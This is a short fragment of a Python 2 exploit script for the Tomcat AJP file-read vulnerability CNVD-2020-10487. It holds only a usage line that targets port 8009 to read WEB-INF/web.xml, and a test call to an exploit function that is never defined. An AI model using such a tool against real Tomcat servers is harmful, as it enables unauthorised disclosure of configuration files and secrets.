# CNVD-2020-10487-tomcat-fileread


def usage():
	print '''python tomcatfileread.py 192.168.0.1 8009 WEB-INF/web.xml''' 

def test():
	exploit('10.10.0.81', 8009)
